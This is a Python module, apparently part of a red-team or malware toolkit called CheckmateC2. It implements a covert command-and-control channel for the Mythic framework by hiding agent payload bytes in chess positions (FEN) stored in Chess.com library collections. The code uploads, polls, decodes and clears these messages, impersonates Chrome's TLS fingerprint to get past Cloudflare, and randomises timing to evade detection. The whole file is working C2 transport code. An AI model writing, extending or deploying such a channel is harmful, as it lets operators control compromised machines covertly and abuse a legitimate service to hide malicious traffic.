"""
Chess.com HTTP client (library collections + PGN/FEN), CheckmateC2 compatible.

Plain httpx GET requests often get a 403 from Cloudflare (TLS fingerprinting).
Uses curl_cffi with Chrome impersonation when available, falls back to httpx.
"""

from __future__ import annotations

import asyncio
import json
import logging
import random
from typing import Any, Optional

import httpx

from base5_fen import MARKER_FEN, Base5Chess

logger = logging.getLogger(__name__)

DEFAULT_SKIP_IDS = frozenset(
    {
        "1acdf52c-1df4-11f1-87b9-b143e701000d",
        "e0335fb2-1e19-11f1-88eb-c276b801000d",
    }
)

PGN_TEMPLATE = (
    '[Event "?"]\n[Site "?"]\n[Date "????.??.??"]\n[Round "?"]\n'
    '[White "?"]\n[Black "?"]\n[Result "*"]\n[SetUp "1"]\n[FEN "{fen}"]\n\n*'
)

# Browser TLS fingerprint via curl_cffi - required to bypass Cloudflare on most IPs.
IMPERSONATE = "chrome"

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)

SEC_CH_UA = '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"'


def _headers_get(cookie: str, referer: str = "") -> dict[str, str]:
    """No manual Host header. Referer must match the browser URL for the collection page."""
    ref = (referer or "").strip()
    if not ref:
        ref = "https://www.chess.com/analysis"
    return {
        "Cookie": cookie,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.chess.com",
        "Referer": ref,
        "User-Agent": USER_AGENT,
        "sec-ch-ua": SEC_CH_UA,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }


def _headers_json(cookie: str, referer: str = "") -> dict[str, str]:
    h = _headers_get(cookie, referer)
    h["Content-Type"] = "application/json"
    return h


def _get_sync(url: str, params: dict[str, str], headers: dict[str, str]) -> Any:
    try:
        from curl_cffi import requests as cr

        return cr.get(
            url,
            params=params,
            headers=headers,
            impersonate=IMPERSONATE,
            timeout=60,
        )
    except ImportError:
        with httpx.Client(follow_redirects=True) as client:
            return client.get(url, params=params, headers=headers, timeout=60.0)


def _post_json_sync(url: str, headers: dict[str, str], body: dict) -> Any:
    try:
        from curl_cffi import requests as cr

        return cr.post(
            url,
            headers=headers,
            json=body,
            impersonate=IMPERSONATE,
            timeout=120,
        )
    except ImportError:
        with httpx.Client(follow_redirects=True) as client:
            return client.post(url, headers=headers, json=body, timeout=120.0)


class ChessComClient:
    def __init__(
        self,
        cookie: str,
        upload_token: str,
        clear_token: str,
        agent_to_server_collection: str,
        server_to_agent_collection: str,
        skip_item_ids: Optional[frozenset[str]] = None,
        wait_seconds: float = 5.0,
        jitter_seconds: float = 3.0,
        library_referer: str = "",
    ):
        self.cookie = cookie
        self.upload_token = upload_token
        self.clear_token = clear_token
        self.inbound_id = agent_to_server_collection
        self.outbound_id = server_to_agent_collection
        self.skip_ids = skip_item_ids if skip_item_ids is not None else DEFAULT_SKIP_IDS
        self.wait_seconds = wait_seconds
        self.jitter_seconds = jitter_seconds
        self.library_referer = (library_referer or "").strip()

    async def _sleep_jitter(self) -> None:
        await asyncio.sleep(
            self.wait_seconds + random.uniform(0, max(0.0, self.jitter_seconds))
        )

    async def list_games(self, collection_id: str) -> list[tuple[str, str]]:
        url = f"https://www.chess.com/callback/library/collections/{collection_id}/items"
        params = {
            "page": "1",
            "itemsPerPage": "10000",
            "gameSort": "1",
            "gamePlayer1": "",
        }
        headers = _headers_get(self.cookie, self.library_referer)
        try:
            resp = await asyncio.to_thread(_get_sync, url, params, headers)
        except Exception as e:
            logger.warning("chess list request failed: %s", e)
            return []

        if resp.status_code == 403:
            txt = (getattr(resp, "text", "") or "")[:800]
            hint = "expired cookie, blocked IP (datacenter/Cloudflare), or curl_cffi missing from the C2 image."
            try:
                err = json.loads(txt)
                msg = str(err.get("message", "")).lower()
                if "insufficient permissions" in msg:
                    hint = (
                        "Chess.com denied access to this collection: check UUID + same account as the cookie. "
                        "Also set the optional library_referer parameter to the full collection URL from your "
                        "browser address bar (e.g. .../analysis/collection/.../games) - it must match the "
                        "Referer header of the working network request, otherwise the API returns Insufficient permissions."
                    )
            except json.JSONDecodeError:
                pass
            logger.warning("chess list 403 - %s body (excerpt): %s", hint, txt.replace("\n", " ")[:400])
            return []
        if resp.status_code >= 400:
            logger.warning("chess list HTTP %s", resp.status_code)
            return []

        try:
            payload = resp.json()
        except Exception as e:
            logger.warning("chess list invalid JSON: %s", e)
            return []

        games: list[tuple[str, str]] = []
        for item in payload.get("data", []):
            game_id = item.get("id")
            fen = (
                item.get("typeSpecificData", {})
                .get("shareData", {})
                .get("pgnHeaders", {})
                .get("FEN")
            )
            if game_id and fen and game_id not in self.skip_ids:
                games.append((game_id, fen))
        return games

    async def clear_collection(self, collection_id: str) -> None:
        games = await self.list_games(collection_id)
        if not games:
            return
        for start in range(0, len(games), 100):
            batch = games[start : start + 100]
            ids = [g[0] for g in batch]
            url = (
                f"https://www.chess.com/callback/library/collections/"
                f"{collection_id}/actions/remove-items"
            )
            data = {"_token": self.clear_token, "itemIds": ids}
            headers = _headers_json(self.cookie, self.library_referer)
            resp = await asyncio.to_thread(_post_json_sync, url, headers, data)
            if resp.status_code >= 400:
                txt = (getattr(resp, "text", "") or "")[:400]
                logger.warning("chess remove-items HTTP %s: %s", resp.status_code, txt)

    async def upload_games(self, collection_id: str, fens: list[str]) -> None:
        pgn_string = ""
        for fen in fens:
            pgn_string = pgn_string + "\n\n" + PGN_TEMPLATE.format(fen=fen)
        url = (
            f"https://www.chess.com/callback/library/collections/"
            f"{collection_id}/actions/add-from-pgn"
        )
        data = {"_token": self.upload_token, "pgn": pgn_string}
        headers = _headers_json(self.cookie, self.library_referer)
        resp = await asyncio.to_thread(_post_json_sync, url, headers, data)
        if resp.status_code >= 400:
            txt = (getattr(resp, "text", "") or "")[:400]
            logger.warning("chess add-from-pgn HTTP %s: %s", resp.status_code, txt)
            resp.raise_for_status()

    async def upload_payload(self, collection_id: str, payload: bytes) -> None:
        """Encode raw Mythic payload bytes into FEN games and upload to the collection."""
        await self._sleep_jitter()
        await self.clear_collection(collection_id)
        encoded = Base5Chess.encode(payload)
        fens = Base5Chess.string_to_fen(encoded)
        fens = [MARKER_FEN] + fens
        chunk_size = 100
        chunks = [fens[i : i + chunk_size] for i in range(0, len(fens), chunk_size)]
        for chunk in reversed(chunks):
            await self.upload_games(collection_id, chunk)
            await self._sleep_jitter()

    async def wait_download_payload(self, collection_id: str) -> bytes:
        """
        Wait for a complete message (first FEN = marker), matching CheckmateC2 downloadData logic.
        Returns the raw bytes to POST to /agent_message (Mythic base64 string as UTF-8 bytes).
        """
        poll_count = 0
        while True:
            games = await self.list_games(collection_id)
            if len(games) >= 1 and games[0][1] == MARKER_FEN:
                break
            poll_count += 1
            if poll_count % 20 == 0:
                logger.debug(
                    "Still waiting for agent message on %s (%s polls, %s items visible)",
                    collection_id,
                    poll_count,
                    len(games),
                )
            await asyncio.sleep(3.0)

        logger.debug("Marker detected, %s games to decode", len(games))
        out = ""
        for _game_id, fen in games:
            if fen == MARKER_FEN:
                continue
            piece = Base5Chess.fen_to_string(fen)
            out += piece
        b5 = "".join(char for char in out.upper() if char in Base5Chess.ALPHABET)
        if not b5:
            logger.warning("No Base5 characters found in FEN data - empty message?")
            return b""
        return Base5Chess.decode(b5)
